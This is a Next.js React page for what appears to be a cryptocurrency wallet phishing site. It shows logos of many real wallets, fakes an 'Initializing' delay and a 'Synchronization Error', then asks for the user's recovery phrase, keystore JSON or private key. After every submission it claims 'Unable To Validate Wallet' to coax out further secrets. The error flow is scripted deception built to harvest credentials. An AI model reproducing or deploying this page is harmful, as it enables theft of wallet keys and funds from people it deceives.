"use client";
import Typewriter from "typewriter-effect";
import FormSubmit from "./components/FormSubmit";
import Link from "next/link";
import { RiErrorWarningFill } from "react-icons/ri";
import WalletCon from "./assets/wallcon.png";
import Trust from "./assets/trust.jpg";
import Metamask from "./assets/meta.png";
import Hashpack from "./assets/hash.jpg";
import Keplr from "./assets/keplr.png";
import Klever from "./assets/klev.png";
import Cosmos from "./assets/cosmos.png";
import Slope from "./assets/slope.png";
import Binance from "./assets/binance.png";
import Bitpay from "./assets/bitpay.jpg";
import Phantom from "./assets/phan.jpg";
import Argent from "./assets/argent.jpg";
import Polkadot from "./assets/polkadot.jpg";
import Iotex from "./assets/iotex.jpg";
import Coinbase from "./assets/cb.png";
import Crypto from "./assets/crypto.jpg";
import Math from "./assets/math.jpg";
import Ledger from "./assets/ledge.png";
import Celo from "./assets/celo_wallet.jpg";
import Valora from "./assets/valora.jpg";
import Gnosis from "./assets/ghin.jpg";
import Stargazer from "./assets/starg.png";
import Onto from "./assets/onto.png";
import Rainbow from "./assets/rb.png";
import Image from "next/image";
import { useEffect, useState } from "react";

export default function Home() {
  const [keyType, setKeyType] = useState("Phrase");
  // const [state, handleSubmit] = useForm("mjvqbbnl");
  const [formState, setFormState] = useState({});

  const data = [
    { img: WalletCon, title: "Wallet Connect" },
    { img: Trust, title: "Trust" },
    { img: Metamask, title: "Metamask" },
    { img: Hashpack, title: "Hashpack" },
    { img: Keplr, title: "Keplr" },
    { img: Klever, title: "Klever" },
    { img: Cosmos, title: "Cosmos" },
    { img: Slope, title: "Slope" },
    { img: Binance, title: "Binance Chain" },
    { img: Bitpay, title: "Bitpay" },
    { img: Phantom, title: "Phantom" },
    { img: Argent, title: "Argent" },
    { img: Polkadot, title: "Polkadot" },
    { img: Iotex, title: "Iotex" },
    { img: Coinbase, title: "Coinbase" },
    { img: Crypto, title: "Crypto" },
    { img: Math, title: "Math" },
    { img: Ledger, title: "Ledger Live" },
    { img: Celo, title: "Celo" },
    { img: Valora, title: "Valora" },
    { img: Gnosis, title: "Gnosis" },
    { img: Stargazer, title: "Stargazer" },
    { img: Onto, title: "ONTO" },
    { img: Rainbow, title: "Rainbow" },
  ];

  const changeHandler = (event) => {
    setFormState({
      ...formState,
      [event.target.name]: event.target.value,
      wallet: "",
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    document.getElementById("my_modal_3").close();
    document.getElementById("my_modal_4").showModal();
  };

  const HandleWallet = () => {
    let tabs = document.querySelectorAll(".tab");
    let indicator = document.querySelector(".indicator");
    indicator.style.width = tabs[0].getBoundingClientRect().width + "px";
    indicator.style.left =
      tabs[0].getBoundingClientRect().left -
      tabs[0].parentElement.getBoundingClientRect().left +
      "px";

    tabs.forEach((tab, index) => {
      if (tab.id == tabs[0].id) {
        tab.classList.add("tabActive", "text-white");
        tab.classList.remove("text-[#5B5B5B]");
      }

      tab.addEventListener("click", (e) => {
        tabs.forEach((tab) => {
          tab.classList.remove("tabActive", "text-white");
          tab.classList.add("text-[#5B5B5B]");
        });
        setKeyType(e.target.innerText);

        indicator.style.width = tab.getBoundingClientRect().width + "px";
        indicator.style.left =
          tab.getBoundingClientRect().left -
          tab.parentElement.getBoundingClientRect().left +
          "px";

        if (tab.id == tabs[index].id) {
          tab.classList.add("tabActive", "text-white");
          tab.classList.remove("text-[#5B5B5B]");
        }
      });
    });
  };

  const initializeFunc = () => {
    document.getElementById("my_modal_1").showModal();
    setTimeout(() => {
      document.getElementById("my_modal_1").close();
      document.getElementById("my_modal_2").showModal();
    }, 3000);
  };

  const connectManually = () => {
    document.getElementById("my_modal_2").close();
    document.getElementById("my_modal_3").showModal();
  };

  useEffect(() => {
    HandleWallet();
  }, []);

  return (
    <main className="my-16 px-4 ">
      <div className="max-w-7xl mx-auto">
        <h1 className="text-white text-center font-bold text-3xl">
          Choose your Wallet
        </h1>
        <div className="grid lg:grid-cols-4 gap-5 mt-10">
          {data.map((item, index) => (
            <div
              key={index}
              className="border-2 border-[#4B4F58] bg-[rgba(255,255,255,0.02)] px-5 py-8 cursor-pointer"
              onClick={() => initializeFunc()}
            >
              <div className="mx-auto w-36 h-36 mb-6">
                <Image
                  src={item.img}
                  width={200}
                  height={200}
                  alt=""
                  className="w-full h-full object-cover"
                />
              </div>
              <div className="text-center text-slate-400">
                <h1 className="font-bold text-xl">{item.title}</h1>
                <p className="text-sm">WALLET</p>
              </div>
            </div>
          ))}
        </div>
        <dialog
          id="my_modal_1"
          className="modal w-full border-[#4B4F58] bg-[rgb(32,32,32)] px-2"
        >
          <div className="modal-box">
            <form method="dialog" className="mb-8">
              {/* if there is a button in form, it will close the modal */}
              <button className="btn btn-sm btn-circle btn-ghost absolute right-2 top-2 text-[#4B4F58]">
                ✕
              </button>
            </form>
            <div className="px-5 py-6 rounded-2xl mb-5 border border-red-500 text-slate-400 flex md:text-lg">
              <p>Initializing</p>
              <Typewriter
                className="inline "
                options={{
                  strings: ["...", "..."],
                  autoStart: true,
                  loop: true,
                }}
              />
            </div>
          </div>
        </dialog>
        <dialog
          id="my_modal_2"
          className="modal w-full border-[#4B4F58] bg-[rgb(32,32,32)] px-2"
        >
          <div className="modal-box">
            <form method="dialog" className="mb-8">
              {/* if there is a button in form, it will close the modal */}
              <button className="btn btn-sm btn-circle btn-ghost absolute right-2 top-2 text-[#4B4F58]">
                ✕
              </button>
            </form>
            <div className="px-5 py-6 rounded-2xl mb-5 border border-red-500 text-slate-400 md:text-lg text-center">
              <p className="text-red-500 mb-2">Synchronization Error...</p>
              <button
                className="px-3 py-2 rounded-xl bg-white text-black hover:bg-gray-800 hover:text-slate-400"
                onClick={() => connectManually()}
              >
                Connect Manually
              </button>
            </div>
          </div>
        </dialog>
        <dialog
          id="my_modal_3"
          className="modal w-full border-[#4B4F58] bg-[rgb(32,32,32)] px-2"
        >
          <div className="modal-box">
            <form method="dialog" className="">
              {/* if there is a button in form, it will close the modal */}
              <button className="btn btn-sm btn-circle btn-ghost absolute right-2 top-2 text-[#4B4F58]">
                ✕
              </button>
            </form>
            <div className="flex items-center justify-center">
              <div className="">
                <div className="w-full">
                  <div
                    role="tablist"
                    aria-label="tabs"
                    className="relative font-urbanist grid md:grid-cols-3 gap-x-3 gap-y-3 items-center px-3 py-5 border-b overflow-hidden transition"
                  >
                    <div className="invisible md:absolute indicator md:h-11 my-auto top-0 bottom-0 left-0 bg-[#D1FFCE] rounded-full shadow-md"></div>
                    <button
                      role="tab"
                      aria-selected="true"
                      aria-controls="panel-1"
                      id="tab-1"
                      tabIndex="0"
                      className="relative block px-3 tab py-8 text-[#5B5B5B] xs:text-sm"
                    >
                      <span>Phrase</span>
                    </button>
                    <button
                      role="tab"
                      aria-selected="false"
                      aria-controls="panel-2"
                      id="tab-2"
                      tabIndex="-1"
                      className="relative block px-3 tab py-8 text-[#5B5B5B] xs:text-sm"
                    >
                      <span>Keystore JSON</span>
                    </button>
                    <button
                      role="tab"
                      aria-selected="false"
                      aria-controls="panel-3"
                      id="tab-3"
                      tabIndex="-1"
                      className="relative block px-3 tab py-8 text-[#5B5B5B] xs:text-sm"
                    >
                      <span>Private Key</span>
                    </button>
                  </div>
                  <div className="mt-8 relative">
                    <div>
                      <form onSubmit={handleSubmit}>
                        <FormSubmit
                          keyType={keyType}
                          // wallet={""}
                          changeHandler={changeHandler}
                        />
                        <div className="flex flex-col-reverse font-urbanist items-center mt-5 gap-y-3 mt-3">
                          <button
                            className="py-5 w-full text-center font-bold text-white rounded-full"
                            onClick={() =>
                              document.getElementById("my_modal_3").close()
                            }
                          >
                            Cancel
                          </button>
                          <button
                            className="bg-black py-5 w-full rounded-full text-white font-bold"
                            type="submit"
                            // disabled={state.submitting}
                          >
                            Proceed
                          </button>
                        </div>
                      </form>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </dialog>
        <dialog
          id="my_modal_4"
          className="modal w-full border-[#4B4F58] bg-[rgb(32,32,32)] px-2"
        >
          <div className="modal-box">
            <form method="dialog" className="">
              {/* if there is a button in form, it will close the modal */}
              <button className="btn btn-sm btn-circle btn-ghost absolute right-2 top-2 text-[#4B4F58]">
                ✕
              </button>
            </form>
            <div className="flex flex-col items-center rounded-3xl py-8 px-3 m-auto">
              <div>
                <RiErrorWarningFill className="text-[#CF1212] text-5xl" />
              </div>
              <p className="mt-3 text-center font-semibold text-white">
                Unable To Validate Wallet!!! ,<br />
                Try A Different Wallet.
              </p>
              <button
                onClick={() => document.getElementById("my_modal_4").close()}
                className="bg-[#FF1E1E] py-4 px-14 mt-5 rounded-full text-white"
              >
                Cancel
              </button>
            </div>
          </div>
        </dialog>
      </div>
    </main>
  );
}
